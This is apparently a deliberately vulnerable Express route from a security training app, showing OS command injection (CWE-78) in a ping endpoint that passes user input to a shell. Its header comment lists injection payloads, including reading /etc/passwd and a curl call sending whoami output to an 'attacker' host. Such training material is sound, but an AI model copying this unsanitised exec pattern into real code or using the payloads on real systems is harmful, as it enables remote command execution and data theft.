// =====================================================================
// VULN-006  OS COMMAND INJECTION
// CWE-78  |  OWASP A03:2021  |  CVSS 9.8 (Critical)
// ---------------------------------------------------------------------
// Passa o host direto para `child_process.exec` (shell = true).
// Payloads clássicos:
//   { "host": "127.0.0.1; cat /etc/passwd" }
//   { "host": "127.0.0.1 && whoami" }
//   { "host": "127.0.0.1 | type C:\\Windows\\win.ini" }
//   { "host": "$(curl http://attacker/$(whoami))" }
// Sem allowlist, sem shell-escape, sem execFile.
// =====================================================================
const express = require('express');
const { exec } = require('child_process');
const router = express.Router();

router.post('/ping', (req, res) => {
  const host = (req.body && req.body.host) || '127.0.0.1';
  // Concatenação crua -> injeção de comando trivial
  const isWin = process.platform === 'win32';
  const cmd = isWin ? `ping -n 2 ${host}` : `ping -c 2 ${host}`;
  exec(cmd, { timeout: 10000, shell: true }, (err, stdout, stderr) => {
    // Devolve tudo para facilitar exfiltração in-band
    res.json({
      cmd,
      stdout: stdout && stdout.toString(),
      stderr: stderr && stderr.toString(),
      error: err ? err.message : null
    });
  });
});

module.exports = router;
